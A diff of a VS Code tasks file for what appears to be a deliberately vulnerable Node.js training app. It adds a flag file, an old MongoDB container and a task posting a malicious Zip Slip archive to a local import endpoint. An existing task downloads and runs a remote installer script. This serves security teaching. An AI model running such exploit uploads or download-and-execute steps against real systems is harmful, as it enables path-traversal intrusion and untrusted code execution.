@@ -4,31 +4,36 @@
     "version": "2.0.0",
     "tasks": [
         {
-            "label": "Install Snyk Studio Tools",
+            "label": "PRE-001 Install Snyk Studio Tools",
             "type": "shell",
             "command": "curl -fsSL 'https://raw.githubusercontent.com/snyk/studio-recipes/main/installer/dist/snyk-studio-install.sh' -o snyk-studio-install.sh;bash ./snyk-studio-install.sh"
         },
         {
-            "label": "Drop Flag",
+            "label": "PRE-002 Drop Flag",
             "type":"shell",
-            "command":"cd /workspaces; echo 'Directory Traversal Flag 001' > flag.txt;"
+            "command":"cd /workspaces; echo 'Directory Traversal Flag found' > flag.txt;"
         },
         {
-            "label": "Run MongoDB",
+            "label": "PRE-003 Run MongoDB",
             "type": "shell",
             "command": "docker ps --filter \"publish=27017\" --format \"{{.ID}}\" | grep -q . || docker run --rm -d -p 27017:27017 mongo:3"
         },
         {
-            "label": "Install dependencies",
+            "label": "PRE-004 Install dependencies",
             "type": "shell",
             "command": "npm install",
-            "dependsOn": ["Run MongoDB"]
+            "dependsOn": ["PRE-003 Run MongoDB"]
         },
         {
-            "label": "Start App",
+            "label": "PRE-005 Start App",
             "type": "shell",
             "command": "npm install && npm start",
-            "dependsOn": ["Run MongoDB"]
+            "dependsOn": ["PRE-003 Run MongoDB"]
+        },
+        {
+            "label": "EXP-001 Zip Slip Exploit",
+            "type": "shell",
+            "command": "curl -X POST http://localhost:3001/import -F 'importFile=@/workspaces/node-gva/exploits/demo/01-adm-zip-slip/malicious_workspace.zip'"
         }
     ]
 }
